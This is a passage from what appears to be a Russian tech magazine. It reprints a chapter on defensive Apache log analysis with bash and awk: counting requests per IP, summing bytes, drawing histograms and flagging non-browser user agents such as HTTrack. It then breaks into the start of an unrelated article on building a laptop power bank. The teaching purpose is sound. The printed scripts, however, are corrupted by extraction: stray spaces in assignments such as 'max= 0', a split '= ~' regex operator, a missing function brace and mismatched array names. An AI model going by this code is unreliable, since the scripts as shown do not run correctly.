данные сце нарию countem.sh. Но в этом случае будут включены строки,
в которых сочетание цифр 404 будет найдено и в других местах (например,
число байтов или часть пути к фай лу). Команда awk ука зывает подсчитывать
только те стро ки, в которых воз вра щаемый статус (поле 9) равен 404. Далее
будет выведен только IР‐адрес (поле 1), а вывод нап равится в сценарий
countem.sh, с помощью которого мы получим общее количес тво запросов,
сделанных IР‐адресом и вызвавших ошибку 404.
  Сначала про ана лизи руем обра зец файла access.log. Начать анализ сле‐
дует с просмотра узлов, которые обращались к веб‐серверу. Вы можете
использовать команду cut операционной системы Linux, с помощью которой
будет извле чено первое поле файла жур нала, где содержится исходный
IР‐адрес. Затем следует передать выходные данные сценарию countem.sh.
Правильная команда и ее вывод показаны здесь:



  $ cut ‐d' ' ‐f1 access.log | bash countem.sh | sort ‐rn


  111 192.168.0.37
  55 192.168.0.36
  51 192.168.0.11
  42 192.168.0.14
  28 192.168.0.26


Если у вас нет дос тупного сценария countem.sh, для дос тижения аналогич‐
ных результатов можно использовать коман ду uniq с параметром ‐c. Но для
корректной работы предварительно потребуется дополнительно отсорти‐
ровать данные.



  $ cut ‐d' ' ‐f1 access.log | sort | uniq ‐c | sort ‐rn


  111 192.168.0.37
  55 192.168.0.36
  51 192.168.0.11
  42 192.168.0.14
  28 192.168.0.26


Вы можете продол жить анализ, обратив внимание на хост с наибольшим
количеством запросов. Как видно из предыдущего кода, таким хостом явля‐
ется IP‐адрес 192.168.0.37, номер которого — 111. Можно использовать awk
для филь трации по IP‐адресу, чтобы затем извлечь поле, содержащее зап‐
рос, передать его команде cut и, наконец, передать вывод сценарию coun‐
tem.sh, который и выдаст общее количество запросов для каждой страницы:



  $ awk '$1 == "192.168.0.37" {print $0}' access.log | cut ‐d' ' ‐f7 |
  bash countem.sh


  1 /uploads/2/9/1/4/29147191/31549414299.png?457
  14 /files/theme/mobile49c2.js?1490908488
  1 /cdn2.editmysite.com/images/editor/theme‐background/stock/iPad.html
  1 /uploads/2/9/1/4/29147191/2992005_orig.jpg
  ...
  14 /files/theme/custom49c2.js?1490908488


Активность этого кон кретного хоста не впечатляет и напоминает стандартное
поведение браузера. Если вы посмотрите на хост со следующим наиболь шим
количеством запросов, то увидите нечто более интересное:



  $ awk '$1 == "192.168.0.36" {print $0}' access.log | cut ‐d' ' ‐f7 |
  bash countem.sh


  1 /files/theme/mobile49c2.js?1490908488
  1 /uploads/2/9/1/4/29147191/31549414299.png?457
  1 /_/cdn2.editmysite.com/.../Coffee.html
  1 /_/cdn2.editmysite.com/.../iPad.html
  ...
  1 /uploads/2/9/1/4/29147191/601239_orig.png


Этот вывод указывает, что хост 192.168.0.36 получил дос туп чуть ли не к каж‐
дой странице сайта только один раз. Данный тип активности часто указывает
на активность веб‐сканера или кло нирование сай та. Если вы пос мотрите
на строку пользовательского аген та, то увидите дополнительное под твержде‐
ние этого предположения:



  $ awk '$1 == "192.168.0.36" {print $0}' access.log | cut ‐d' ' ‐f12‐17 |
  uniq


  "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)


Агент поль зовате ля идентифицирует себя как HTTrack. Это инструмент,
который можно использовать для загрузки или кло нирования сайтов. Хотя
этот инструмент не обязатель но приносит вред, во время анализа стоит
обратить на него внимание.


        WWW

                   •Дополнительная информа ция о HTTrack




СУММИРОВАНИЕ ЧИСЕЛ В ДАННЫХ
Что делать, если вместо того, чтобы подсчи тывать, сколь ко раз IP‐адрес
или дру гие эле менты обращались к определен ным ресурсам, вы хотите
узнать общее количес тво байтов, отправленных по IP‐адресу, или то, какие
IP‐адре са запросили и получили больше всего данных?
  Решение мало чем отличается от сценария countem.sh. Внесите в этот
сценарий несколько небольших изме нений. Во‐первых, вам нужно так нас‐
троить входной филь тр (команда cut), чтобы из большого количества стол‐
бцов извлекались два столбца: IP‐адрес и счетчик байтов, а не только стол‐
бец с IP‐адресом. Во‐вто рых, сле дует изменить вычисление с прираще нием
(let cnt[$id]++) на прос той счет, чтобы суммировать данные из вто рого
поля (let cnt[$id]+= $data).
   Теперь конвейер будет извлекать два поля из файла журнала — пер вое
и последнее:


cut ‐d' ' ‐f 1,10 access.log | bash summer.sh

Сценарий summer.sh, показанный в примере 7.5, чита ет данные из двух стол‐
бцов. Пер вый столбец состоит из значений индекса (в данном случае IP‐
адресов), а второй столбец — это число (в данном случае количество бай тов,
отправленных по IP‐адресу). Каж дый раз, когда сценарий находит в первом
столбце повторяющийся IP‐адрес, он добав ляет значение из второго столбца
к общему количеству байтов для этого адреса, сум мируя таким обра зом
количество байтов, отправленных этим IP‐адресом.


Пример 7.5. summer.sh
declare ‐A cnt # ассоциативный массив
while read id count
do
  let cnt[$id] +=$count
done
for id in "${!cnt[@]}"
do
  printf "%‐15s %8d\n" "${id}" "${cnt[${id}]}" # <1>
done

<1> Обратите внимание, что в формат вывода мы внесли несколько изме‐
нений. К раз меру поля мы добавили 15 символов для первой строки (данные
IP‐адре са, в нашем примере), установи ли выравнивание по левому краю (с
помощью знака минус) и указали восемь цифр для зна чений сум мы. Если
сумма окажется больше, то будет выведено большее число, если же стро ка
окажется длиннее, то она будет напечатана полностью. Это сде лано для того,
чтобы выровнять дан ные по соот ветствующим столбцам: так столбцы будут
аккуратными и более читабельными.
  Для получения представления об общем объеме данных, запрашива емых
каждым хостом, мож но в сце нарии summer.sh запустить файл access.log.
Для этого используйте команду cut, которая извлечет IP‐адрес и переданные
байты полей, а затем передайте вывод в сценарий summer.sh:



  $ cut ‐d' ' ‐f1,10 access.log | bash summer.sh | sort ‐k 2.1 ‐rn


  192.168.0.36 4371198
  192.168.0.37 2575030
  192.168.0.11 2537662
  192.168.0.14 2876088
  192.168.0.26 665693


Эти резуль таты могут быть полезны для выявления хостов, которые передали
необычно большие объемы данных по сравнению с другими хос тами.
Всплеск может указывать на кражу данных и эксфильтра цию. Когда такой хост
будет определен,  нуж но просмотреть  конкретные  страницы и файлы,
к которым он обращался, чтобы попытаться клас сифици ровать его как вре‐
доносный или безопасный.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     АНАЛИЗ ДАННЫХ
               LINUX            В
                                 ГЛАВА ИЗ КНИГИ
                    «BASH И КИБЕРБЕЗОПАСНОСТЬ»





ОТОБРАЖЕНИЕ ДАННЫХ В ВИДЕ ГИСТОГРАММЫ
Можно выполнить еще одно дей ствие, обеспечив более наглядное отоб‐
ражение полученных резуль татов. Вы можете взять вывод сценария countem.
sh или summer.sh и передать его в другой сценарий, который будет соз‐
давать гистограмму, отобража ющую результаты.
  Сценарий, выполняющий печать, будет принимать первое поле в качес тве
индекса ассоциатив ного массива, а второе поле — в качестве зна чения
для этого элемента массива. Затем следует пересмотреть весь массив
и распечатать несколько хештегов для представления самого боль шого чис‐
ла в спис ке (при мер 7.6).


Пример 7.6. histogram.sh
function pr_bar ()                         # <1>
  local ‐i i raw maxraw scaled             # <2>
  raw=$1
  maxraw=$2
  ((scaled=(MAXBAR* raw)/maxraw))           # <3>
  # гарантированный минимальный размер
  (( raw > 0 && scaled == 0)) && scaled= 1   # <4>
  for((i= 0; i<scaled; i++)) ; do printf '#' ; done
  printf '\n'
} # pr_bar
#
# "main"
#
declare ‐A RA
declare ‐i MAXBAR max                      # <5>
max= 0
MAXBAR= 50 # размер самой длинной строки
while read labl val
do
  let RA[$labl]=$val                       # <6>
  # сохранить наибольшее значение; для масштабирования
  (( val > max )) && max=$val
done
# масштабировать и вывести
for labl in "${!RA[@]}"                    # <7>
do
  printf '%‐20.20s ' "$labl"
  pr_bar ${RA[$labl]} $max                 # <8>
done

<1> Мы определяем функцию, с помощью которой нарисуем один столбец
гистограммы. Определе ние должно находиться перед самой функци ей,
поэтому име ет смысл поместить все определе ния функций в начале нашего
сценария. Данная фун кция в будущем сценарии будет использована пов‐
торно, поэтому ее можно помес тить в отдельный файл и подключать
с помощью команды source. Но мы сде лали по‐другому.
  <2> Мы объявляем все эти переменные локаль ными, так как не хотим,
чтобы они мешали определению имен переменных в остальной части дан‐
ного сценария (или любых других, если мы копируем/вставляем этот сце‐
нарий для использования в другом месте). Мы объ являем все эти перемен‐
ные целыми числами (это параметр ‐i), потому что будем вычислять только
целые зна чения и не станем использовать строки.
  <3> Вычисление выполняет ся в двойных скобках. Внутри них не нужно
использовать символ $ для указания значения каждого имени переменной.
  <4> Это оператор if‐less. Если выражение внутри двойных скобок равно
true, то тог да и только тогда выпол няется второе выражение. Такая конструк‐
ция гарантирует, что если исходное значение не равно нулю, то мас штабиро‐
ванное зна чение никогда не будет равно нулю.
  <5> Основная часть сценария начинается с объявления RA как ассо‐
циативного мас сива.
  <6> Здесь мы ссылаемся на ассоциативный массив, исполь зуя мет ку
строки в качес тве его индекса.
  <7> Поскольку массив не индексируется по числам, мы не можем просто
считать целые чис ла и использовать их в качестве индексов. Эта конструкция
определяет все раз личные строки, которые использовались в качестве
индекса массива, по одному индексу в цикле for.
  <8> Мы еще раз используем метку как индекс, что бы получить счетчик
и передать его как первый параметр нашей фун кции pr_bar.
  Обратите внимание, что элементы отображаются не в том порядке, что
и вход ные дан ные. Это связано с тем, что алго ритм хеширования для ключа
(индекса) не  сохраняет  порядок. Вы можете  упорядочить  этот вывод
или исполь зовать другой подход.
  Пример 7.7 представляет собой версию сценария для построения гис‐
тограммы — в нем сох раняется последовательность вывода и не использует‐
ся ассоциативный массив. Это также может быть полезно для старых версий
bash (до 4.0), в которых ассо циативный массив еще не использовался. Здесь
показана только основная часть сценария, так как функция pr_bar остается
прежней.


Пример 7.7. histogram_plain.sh
declare ‐a RA_key RA_val                   # <1>
declare ‐i max ndx
max= 0
maxbar= 50 # размер самой длинной строки
ndx= 0
while read labl val
do
  RA_key[$ndx]=$labl                       # <2>
  RA_value[$ndx]=$val
  # сохранить наибольшее значение; для масштабирования
  (( val > max )) && max=$val
  let ndx++
done
# масштабировать и вывести
for ((j= 0; j<ndx; j++))                    # <3>
do
  printf "%‐20.20s " ${RA_key[$j]}
  pr_bar ${RA_value[$j]} $max
done

Эта вер сия сценария позволяет избежать использования ассо циативных
массивов (нап ример, в более старых версиях bash или в системах macOS).
Здесь мы применяем два отдель ных массива: один для индексно го значения
и один — для счетчиков. Пос кольку это обычные мас сивы, мы должны исполь‐
зовать целочисленный индекс и будем вести простой подсчет в переменной
ndx.
  <1> Здесь име на переменных объ являются как массивы. Строчная a ука‐
зывает, что они являются мас сивами, но это не ассоциативные мас сивы.
Это не обязательное требование, зато рекомендуемая прак тика. Аналогично
в следующей стро ке мы зада ем параметр ‐i для объ явле ния этих перемен‐
ных целыми числами, что делает их более эффективными, чем необъ‐
явленные переменные оболочки (которые хранятся в виде строк). Пов торим‐
ся: как видно из того, что мы не объ явля ем maxbar, а просто используем его,
это не обязатель ное требование.
  <2> Пары «ключ/значение» хра нят ся в отдельных мас сивах, но в одном
и том же месте индекса. Это ненадежный подход — изменения в сценарии
в какой‐то момент могут привести к тому, что два мас сива не синхронизи‐
руются.
  <3> Цикл for, в отличие  от предыдущего сценария, исполь зуется
для простого подсчета целых чисел от 0 до ndx. Здесь переменная j выс тупа‐
ет препятствием для индекса в цикле for внутри сценария pr_bar, несмотря
на то что внутри функции мы достаточно аккуратно объ являем эту версию i
как локальную функцию. Вы доверяете этой функции? Изме ните здесь j на i
и проверьте, работает ли цикл (а он работает). Затем попробуйте удалить
локальное объявление и проверить, успешно ли завершится цикл.
   Такой подход с дву мя массивами имеет одно преимущество. Используя
числовой индекс для хранения метки и дан ных, можно получить их в том
порядке, в котором они были прочитаны, — в чис ловом порядке индекса.
   Теперь, извлекая соответству ющие поля из access.log и перено ся
результаты в summer.sh, а затем — в histogram.sh, можно наг лядно увидеть,
какие хос ты передали наибольшее количество байтов:



  $ cut ‐d' ' ‐f1,10 access.log | bash summer.sh | bash histogram.sh


  192.168.0.36 ##################################################
  192.168.0.37 #############################
  192.168.0.11 #############################
  192.168.0.14 ################################
  192.168.0.26 #######


Хотя дан ный подход может показать ся не столь эффективным для неболь‐
шого объема выборочных данных, воз можность визуализации имеет неоце‐
нимое зна чение при рассмотрении более крупных наборов данных.
  Помимо количества байтов, передаваемых через IP‐адрес или хост, часто
интересно прос мотреть данные, отсортированные по дате и времени.
Для этого можно исполь зовать сценарий summer.sh, но из‐за формата файла
access.log, прежде чем передать его в сценарий, его нужно дополнительно
обработать. Если для извлечения переданных полей с датой/временем
и байтов исполь зуется команда cut, остаются дан ные, которые могут вызвать
некоторые проблемы для сценария:



  $ cut ‐d' ' ‐f4,10 access.log


  [12/Nov/2017:15:52:59 2377
  [12/Nov/2017:15:52:59 4529
  [12/Nov/2017:15:52:59 1112


Как видно из этого вывода, необработанные данные начинаются с символа [.
Из‐за него в сценарии появляется проблема, так как он обознача ет начало
массива в bash. Чтобы эту проблему устранить, можно использовать допол‐
нительную итерацию команды cut с параметром ‐c2, с помощью которого
символ будет уда лен.
   Этот параметр указывает команде cut извлекать данные по сим волам,
начиная с позиции 2 и переходя к концу строки (‐). Вот исправленный вывод
с удаленной квадратной скобкой:



  $ cut ‐d' ' ‐f4,10 access.log | cut ‐c2‐


  12/Nov/2017:15:52:59 2377
  12/Nov/2017:15:52:59 4529
  12/Nov/2017:15:52:59 1112



             INFO

                    Вместо  того  чтобы  второй  раз  использовать
                      команду cut, можно  добавить  команду tr.
                      Параметр ‐d удаляет указанный символ — в дан‐
                     ном случае квадратную скобку.

                     cut ‐d' ' ‐f4,10 access.log | tr ‐d
                     '['


Необходимо так же определить способ группирования данных, свя зан ных
с датами: по дню, месяцу, году, часу и т. д. Для этого можно просто изменить
параметр для второй итерации команды cut. В таб лице показаны параметры
команды cut, которые используются для извлечения различных форм поля
даты/времени. Обратите внимание,  что  эти параметры предназначены
для файлов жур нала Apache.





Сценарий histogram.sh может быть особенно полезен при просмотре дан‐
ных, свя занных с датами. Например, если в орга низации имеется внутренний
веб‐сервер, доступ к которому осуществляется только в рабочее время
с 09:00 до 17:00, можно с помощью такой гистограммы ежедневно прос‐
матривать файл журнала сервера, чтобы проверить, имеются ли всплески
активнос ти пос ле обычного рабочего дня.
   Большие всплески активности или передача данных вне обычного рабоче‐
го времени может свидетельствовать об эксфильтрации со стороны зло‐
умышленника. При обнаруже нии каких‐либо аномалий можно отфильтровать
данные по конкретной дате и времени и про верять доступ к странице, чтобы
определить, явля ется ли действие вредоносным.
  Например, если требуется просмотреть гистограмму общего объема дан‐
ных, полученных в определенный день за каждый час, можно выполнить сле‐
дующую коман ду:



  $ awk '$4 ~ "12/Nov/2017" {print $0}' access.log | cut ‐d' ' ‐f4,10 |
  cut ‐c14‐15,22‐ | bash summer.sh | bash histogram.sh


  17 ##
  16 ###########
  15 ############
  19 ##
  18 ##################################################


Здесь файл access.log пересылается с помощью команды awk для извле‐
чения записей с определенной датой. Обратите внимание на использование
вместо символов == оператора подобия (~), поскольку поле 4 также содер жит
информа цию о времени. Эти записи передаются команде cut сначала
для  извле чения  полей  даты/времени  и  переданных  байтов,  а  затем
для извле чения данных о времени. После этого с помощью сценария summer.
sh данные суммируются по времени (часам) и с помощью histogram.sh пре‐
образуются в гистограмму. Результатом становится гистограмма, которая
отображает общее количес тво байтов, передаваемых каждый час 12 нояб‐
ря 2017 года.


             INFO

                       Чтобы  получить  вывод  в  числовом  порядке,
                      передайте его из сценария гис тограммы команде
                   sort ‐n. Зачем нуж на сортировка? Сценарии
                   summer.sh и histogram.sh, просматривая
                      список индексов своих ассоциативных мас сивов,
                       генерируют свои выходные данные. Поэтому их
                      вывод вряд ли будет осмысленным (скорее дан‐
                     ные будут выведены в поряд ке, определяемом
                         внутренним  алгорит мом  хеширования).  Если
                        это объясне ние  оставило  вас равнодушными,
                      просто проигнорируйте его и не забудьте исполь‐
                        зовать сортировку на выходе.
                        Если вы хотите, чтобы вывод был упорядочен
                      по объ ему дан ных, добавь те сортировку между
                        двумя сценариями. Необходимо также исполь‐
                        зовать histogram_plain.sh — версию сце‐
                      нария гис тограммы, в которой не применяются
                       ассоциатив ные мас сивы.



ПОИСК УНИКАЛЬНОСТИ В ДАННЫХ
Ранее IP‐адрес 192.168.0.37 был иден тифици рован как система, которая
имела наибольшее количество запросов страницы. Следующий логичес кий
вопрос: какие страницы запрашивала эта система? Ответив на него, можно
получить пред став ление о том, что система делала на сервере, и клас‐
сифици ровать это действие как безопасное, подозритель ное или вредонос‐
ное. Для это го можно использовать команду awk и cut и передать вывод
в countem.sh:



  $ awk '$1 == "192.168.0.37" {print $0}' access.log | cut ‐d' ' ‐f7 |
  bash countem.sh | sort ‐rn | head ‐5


  14 /files/theme/plugin49c2.js?1490908488
  14 /files/theme/mobile49c2.js?1490908488
  14 /files/theme/custom49c2.js?1490908488
  14 /files/main_styleaf0e.css?1509483497
  3 /consulting.html


Хотя извлечение и обрезка данных могут быть реализова ны путем конвей‐
ерной передачи команд и сценариев, для этого потребуется переда вать дан‐
ные несколько раз. Такой метод мож но применить ко многим наборам дан‐
ных, но он не подходит для очень больших наборов. Метод можно оптимизи‐
ровать, написав сценарий bash, специально раз работанный для извлечения
и подсчета количества доступов к страницам, — для этого требуется только
один проход дан ных. В примере 7.8 показан такой сценарий.


Пример 7.8. pagereq.sh
declare ‐A cnt                                       # <1>
while read addr d1 d2 datim gmtoff getr page therest
do
 if [[ $1 == $addr ]] ; then let cnt[$page] += 1 ; fi
done
for id in ${!cnt[@]}                                 # <2>
do
 printf "%8d %s\n" ${cnt[$id]} $id
done

<1> Мы объявляем cnt как ассоциативный массив и в качестве индекса
можем использовать строку. В данной программе в качестве индекса мы
будем исполь зовать адрес стра ницы (URL).
  <2> ${!cnt[@]} выводит спи сок всех значений индекса, которые были
обнаружены. Обратите внимание: они не будут перечислены в удобном
порядке.
  В ранних вер сиях bash ассо циативных массивов нет. Подсчи тать количес‐
тво различных запросов страниц с определенного IP‐адреса вы можете
с помощью команды awk, потому что в ней есть ассо циативные массивы (при‐
мер 7.9).


Пример 7.9. pagereq.awk
# подсчитать количество запросов страниц с адреса ($1)
awk ‐v page="$1" '{ if ($1==page) {cnt[$7]+=1 } }
END { for (id in cnt) {                   # <1>
    printf "%8d %s\n", cnt[id], id        # <2>
  }
}'

<1> В этой строке есть две переменные $1, разница между которыми очень
большая. Первая переменная $1 является переменной оболочки и ссылается
на первый аргумент, пре доставленный этому сценарию при его вызове. Вто‐
рая переменная $1 — это awk. В каждой стро ке эта перемен ная отно сится
к пер вому полю ввода. Первая переменная $1 была назначена переменной
page awk, что бы ее можно было сравнить с каждой перемен ной $1 awk (с
каждым первым полем входных данных).
  <2> Простой синтаксис приводит к тому, что переменная id перебирает
значения индекса в массиве cnt. Это гораздо более простой синтаксис, чем
синтаксис оболочки ${!cnt[@]}, но такой же эффективный.
  Можно запустить сце нарий pagereq.sh, ука зав IP‐адрес, который тре‐
буется най ти и перенаправить access.log в качес тве вход ных данных:



  $ bash pagereq.sh 192.168.0.37 < access.log | sort ‐rn | head ‐5


  14 /files/theme/plugin49c2.js?1490908488
  14 /files/theme/mobile49c2.js?1490908488
  14 /files/theme/custom49c2.js?1490908488
  14 /files/main_styleaf0e.css?1509483497
  3 /consulting.html



ВЫЯВЛЕНИЕ АНОМАЛИЙ В ДАННЫХ
В Интерне те стро ка агента пользователя представляет собой неболь‐
шой фраг мент текстовой информа ции, отправляемый браузером на веб‐сер‐
вер, который иден тифицирует операционную систему клиента, тип браузера,
версию  и  другую информацию. Обычно  исполь зуется  веб‐серверами
для обеспечения совмести мости страниц с бра узером пользователя. Вот
пример такой строки:


Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101
Firefox/59.0

Эта стро ка идентифицирует систему как Windows NT вер сии 6.3 (она же Win‐
dows 8.1) с 64‐разрядной архитектурой и с браузе ром Firefox. Строка агента
пользователя может нас заинтересовать по двум при чинам. Во‐пер вых, зна‐
чительный объем информации, которую эта строка передает, можно при‐
менять для идентификации типов систем и браузеров, обращающихся к сер‐
веру. Во‐вторых, эта строка настра ивает ся конечным пользователем и может
быть исполь зована для иден тификации систем, в которых не установлен стан‐
дартный бра узер или вообще нет браузера (поисковых роботов, web crawler).
  Вы можете опре делить необыч ные пользовательские  агенты,  пред‐
варительно составив список известных безопасных пользовательских аген‐
тов. Для этого упражнения мы используем очень малень кий список браузе‐
ров, которые не являются специфичными для конкретной версии (при‐
мер 7.10).


Пример 7.10. useragents.txt
Firefox
Chrome
Safari
Edge


        WWW

                    •Список популярных пользовательских агентов



Затем вы можете прочитать журнал веб‐сервера и срав нить каж дую строку
со списком популярных пользовательских агентов (браузеров), пока не будет
получено совпадение. Если совпадения не будет, стро ка должна рассмат‐
риваться как аномалия и печататься в стандартном выводе вместе с IP‐адре‐
сом системы, выпол няющей запрос. Такое сравнение дает нам дополнитель‐
ную информацию,  связанную с рассматрива емыми данными, — с ее
помощью мы сможем идентифицировать систему  с необычным  поль‐
зовательским агентом и получим еще один путь для дальнейшего изучения.


Пример 7.11. useragents.sh
# несовпадение — поиск по массиву известных имен
# возвращает 1 (false), если совпадение найдено
# возвращает 0 (true), если совпадений нет
function mismatch ()                                  # <1>
{
  local ‐i i                                          # <2>
  for ((i= 0; i<$KNSIZE; i++))
  do
    [[ "$1" = ~ .*${KNOWN[$i]} .* ]] && return 1        # <3>
  done
  return 0
}
readarray ‐t KNOWN < "useragents.txt"                 # <4>
KNSIZE=${#KNOWN[@]}                                   # <5>
# предварительная обработка лог‐файла (stdin),
# чтобы выбрать IP‐адреса и пользовательские агенты
awk ‐F'"' '{print $1, $6}' | \
while read ipaddr dash1 dash2 dtstamp delta useragent # <6>
do
  if mismatch "$useragent"
  then
    echo "anomaly: $ipaddr $useragent"
  fi
done

<1> Сценарий будет основан на функции несовпадения. Если обнаружится
несоответствие, будет воз вра щено успешное зна чение (или true). Это значит,
что совпадение со списком известных пользовательских агентов не най дено.
Данная логика может показаться нес тандар тной, но так удобнее читать опе‐
ратор if, содержащий вызов mismatch.
  <2> Объявление нашего цикла for в качестве локальной перемен ной —
хорошая идея. Данный шаг в сценарии не является обязательным.
  <3> Здесь представ лены две строки для сравнения: вход ные данные
из фай ла журнала и строка из списка известных пользовательских агентов.
Для  гибкого  сравнения  используется  оператор  сравнения  регуляр ных
выражений (=~). Зна чение .* (ноль или более вхождений любого символа),
размещенное по обе сто роны ссылки массива $KNOWN, говорит о том, что
совпадение известной строки может быть най дено в любом месте дру гой
строки.
  <4> Каж дая строка фай ла добав ляет ся как элемент к указанному имени
массива. Это дает нам массив известных пользовательских агентов. В bash
существует два спо соба добавить строки к массиву: использовать либо
readarray, как сделано в этом примере, либо mapfile. Опция ‐t удаляет
завершающий символ новой стро ки из каждой прочитан ной строки. Здесь
указан файл, содержащий список известных пользователь ских агентов;
при необ ходимос ти его можно изменить.
  <5> Здесь вычисляется размер массива. Полученное значение исполь‐
зуется внутри функции mismatch для циклического перебора мас сива. Вне
нашего цикла мы вычисляем его один раз, чтобы при каждом вызове функции
избежать повторного вычисления.
  <6> Входная  стро ка представляет собой сложное  сочетание  слов
и кавычек. Чтобы захватить стро ку агента пользовате ля, в качес тве раз‐
делителя полей мы указываем двойные кавычки. Однако это означает, что
наше первое поле содер жит больше чем просто IP‐адрес. Используя команду
read для получе ния IP‐адреса, мы можем проанализи ровать пробелы. Пос‐
ледний аргумент read при нима ет все оставшиеся слова, чтобы можно было
захватить все слова строки пользовательского агента.
  При запус ке сценария useragents.sh будут выведены любые строки
пользовательского аген та, не найден ные в файле useragents.txt:



  $ bash useragents.sh < access.log


  anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
  anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
  anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
  anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
  ...
  anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)



ВЫВОДЫ
В этой главе мы рассмотрели методы статистического ана лиза для выяв‐
ления необычной и аномальной активнос ти в файлах журналов. Такой анализ
даст вам представ ление о том, что происходило ранее. В следующей главе
мы рассмотрим, как анализировать фай лы журналов и другие данные, чтобы
понять, что происходит в системе в режиме реального времени.
 GEEK

ГАЛЬВАНИЧЕСКАЯ
    БАНКА





 ДЕЛАЕМ POWER BANK
 ДЛЯ НОУТБУКА
                                                                                      Hackcat В ДОМАШНИХ УСЛОВИЯХ                   Еще больше котов — на
                                                                                             https://t.me/meawdream
                                                                                          hackcat.dev@gmail.com





 Портатив ные внеш ние  акку муляторы, или «повербанки»,
 как их кли чут в народе, хороши всем, кро ме выходной мощ‐
 ности, к тому же они не могут заряжать ноут буки без USB
 Type‐C и Power Delivery. Приходится таскать с собой заряд‐
 ное устрой ство, а то и смен ный аккумулятор. Меня это не
 устроило, так что я решил сделать «банку» помощ нее. А коль
 уж мощ ность позволяет — пусть и телефо ны заряжа ет! Сей‐
 час я расска жу, как повторить это незамыс ловатое устрой‐
 ство.


 Я — счас тливый обладатель ноутбука Asus серии K53, который под нагрузкой
 кушает порядка 70 Вт. Следовательно, провод с триггером быстрой зарядки
 на 12 В и пла та‐повышайка с «Алиэкспресса» тут не помогут — быстрая
 зарядка Quick Charge 3.0 выда ет максимум 12 В / 1,5 А (18 Вт) минус потери
 из‐за не 100%‐го КПД преобразова теля. Более мощную «банку» с Power De‐
  livery я покупать не хочу. Комплект сменных аккумуляторов не вари ант, ноутбук
 с зарядным и так весит больше 3 кг.
   Короче, я у мамы инженер, недавно пришел новенький паяльник с «Али»,
 в ящике валяется мешок банок 18650, и как раз приехали пла ты BMS
 и понижающий модуль. Решено было собирать свой аккумулятор, что я и сде‐
 лал, посвятив этому занятию три свободных вечера.


 ТРЕБОВАНИЯ
 Кратко обрисую тре бования, которые я предъявлял к сво ей самоделке.
  1. За ряд ка от штат ного ноутбучного БП. Через Micro‐USB заряжать такой
    емкий аккумулятор — мазохизм, кабеля Type‐C в доме нет ни одного,
    а делать отдельный зарядник специально для своей самодел ки не кошер‐
    но, хочется иметь возможность зарядиться от чего угодно. 220‐воль товое
    гнездо требует довольно габаритной схемы понижения и выпрямления,
    которая к тому же нуждает ся в охлаждении даже при исполь зовании
    импульсного тран сформатора. Поэто му на вход будет стан дар тное гнез‐
    до 5,5 × 2,5 мм, куда можно вставить любой зарядник с напряжением
    от 13 до 32 В.
  2. Большая емкость для продолжительной автоном ной работы. Тас кать
    с собой уве сис тую шту ку, которая сядет через минут двадцать, — удоволь‐
    ствие посредственное. Если уж делать, то делать довольно емкий, чтоб
    потом не бегать глазами вок руг в поисках розетки.
  3. Выход — стандартный штекер 5,5 × 2,5 мм. Само собой, если ты решишь
    повторить эту самоделку и у тебя другой разъ ем — его легко заменить
   любым дру гим.
  4. Кнопка‐выключатель, для удобства и что бы не расходовать заряд батареи
    током холостого хода выход ного пре образователя и индикаторами.
  5. USB‐выход с поддержкой быстрой зарядки для смартфона.
  6. Высокая выходная мощность для нормаль ной зарядки ноут бука.
  7. По возможности — регули руемое выходное напряжение для безболез‐
    ненной перестройки под другой ноут бук при необ ходимости.


 МАТЕРИАЛЫ
 Здесь все стандартно для такого рода гаджетов. Собственно акку муляторные
 ячейки, пла та BMS, входной понижающий и выходной повышающий преобра‐
 зователи, контроллер быс трой зарядки для USB‐выхода и рас ходники
 для корпуса.
   С аккумуляторами тоже все традиционно: литий‐ион ные ячейки типораз‐
 мера 18650 прочно засели в арсенале самодельщиков и позиции сда вать
 не собира ются. Они емкие, удобны для создания батарей, относительно
 недороги, и их можно за копейки (а то и бес платно) набрать в сер вис‐центрах
 из дохлых ноут бучных батарей. Емкость в таком случае оставляет желать луч‐
 шего, но зато это крайне дос тупный вариант для деревенских нищебродов
 вроде меня.
   Плата BMS (Battery Management System) нуж на всегда, если пос ледова‐
 тельно соединяется боль ше одной ячейки. Дело в том, что даже про изведен‐
 ные в одной партии аккумуляторы имеют слегка раз личные характеристики,
 в частности — емкость. При последовательном соединении ячеек разной
 емкости они будут разряжаться неравномер но, то есть минимум одна ячейка
 уйдет в переразряд. А, как ты зна ешь, переразряд для литиевых банок —
 это не прос то плохо, а очень плохо.
   Обратное про изой дет при зарядке такой батареи: менее емкие ячейки
 зарядят ся быстрее, и дальнейшая зарядка при ведет к неконтро лиру емой
 реакции горения, в прос тонародье зовущейся взрывом. Горящие литиевые
 аккумуляторы, рас кидывающие вокруг куски адского неугасимого пламени,
 конечно, выг лядят красиво, но это небезопасно, так что давай не будем
 доводить их до такого состояния, а просто вос пользуем ся BMS.
    Грамотные BMS имеют в составе балансировщик ячеек и схему защиты,
 которая отключит батарею в случае перегрузки, перезаряда или перераз‐
 ряда, и стоят при этом всего пару баксов. Впрочем, силь но эко номить
 на защите не сле дует, так что перед покупкой все же почитай отзывы.
 Попадались  пла ты,  в  которых  заявленный балансировщик не  работал
 или вообще отсутствовал.
   Понижающий DC‐DC‐конвертер по вхо ду нужен для получения ста биль‐
 ного рабочего напряжения зарядки акку муляторов из неизвестного (хоть
 и заведо мо более высоко го) входного. Его важные осо бенности — наличие
 хоть небольшого радиатора, так как вся входная мощность будет про ходить
 через него, и, опционально, присутствие огра ничителя по току, чтобы с ходу
 не убить преобразователь мощ ным током при зарядке в ноль севших акку‐
 муляторов.
   Выходной DC‐DC‐преобразователь — это то, на чем я решил сэкономить,
 и горько об этом пожалел, но об этом чуть поз же. Его задача — обеспечить
 требуемое стабильное выходное напряжение из напряжения нашей батареи.
 В идеале он должен иметь защиту от коротких замыканий и перегрузки, чтобы
 потом не думать, чем его заменить. Ну и хоть небольшой радиатор, по опы ту,
 точно не повредит.
   Быстрая заряд ка — отдельная тема. Как ты знаешь, она использует линии
